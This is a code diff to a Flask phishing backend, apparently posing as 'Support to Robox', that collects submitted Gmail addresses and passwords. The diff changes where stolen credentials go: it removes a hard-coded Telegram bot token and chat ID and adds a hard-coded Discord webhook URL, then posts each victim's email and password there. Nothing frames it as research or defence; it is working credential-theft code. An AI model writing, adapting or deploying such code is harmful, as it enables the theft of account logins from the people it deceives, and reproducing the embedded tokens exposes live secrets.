@@ -3,8 +3,7 @@ import requests
 
 app = Flask(__name__, template_folder='.', static_folder='.')
 
-BOT_TOKEN = "9180802817:AAEjgov9nzXgV_Wtvun7I4rkLg2wOn4Dp4s"
-CHAT_ID = "6517028407"
+DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1573352278713303052/1CJuJ0LpyAKOAxxLRhz_gMqrCbmtBc2p5Vvcakur5_cW4l7dLKd3aWjJOqwlzPuzUgwz"
 
 @app.route('/')
 def index():
@@ -19,24 +18,27 @@ def submit():
     if not email or not password:
         return jsonify({'status': 'error', 'message': 'يرجى إدخال جميع البيانات'}), 400
 
-    text = f"🔔 **بيانات جديدة - Support to Robox**\n\n📧 **الجيميل:** `{email}`\n🔑 **الرمز:** `{password}`"
-    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
     payload = {
-        "chat_id": CHAT_ID,
-        "text": text,
-        "parse_mode": "Markdown"
+        "embeds": [
+            {
+                "title": "🔔 بيانات جديدة - Support to Robox",
+                "color": 5814783,
+                "fields": [
+                    {"name": "📧 Gmail", "value": f"`{email}`", "inline": False},
+                    {"name": "🔑 الرمز", "value": f"`{password}`", "inline": False}
+                ]
+            }
+        ]
     }
 
     try:
-        response = requests.post(url, json=payload, timeout=10)
-        res_data = response.json()
-        if response.status_code == 200 and res_data.get("ok"):
+        response = requests.post(DISCORD_WEBHOOK_URL, json=payload, timeout=10)
+        if response.status_code in (200, 204):
             return jsonify({'status': 'success', 'message': 'تم الإرسال بنجاح'})
         else:
-            error_desc = res_data.get("description", "خطأ غير معروف من تليجرام")
-            return jsonify({'status': 'error', 'message': f'خطأ تليجرام: {error_desc}'}), 500
-    except Exception as e:
-        return jsonify({'status': 'error', 'message': f'خطأ في الاتصال: {str(e)}'}), 500
+            return jsonify({'status': 'error', 'message': f'تعذر الاتصال بالديسكورد ({response.status_code})'}), 500
+    except Exception:
+        return jsonify({'status': 'error', 'message': 'تعذر الاتصال بالديسكورد، حاول لاحقاً'}), 500
 
 if __name__ == '__main__':
     app.run(debug=True)
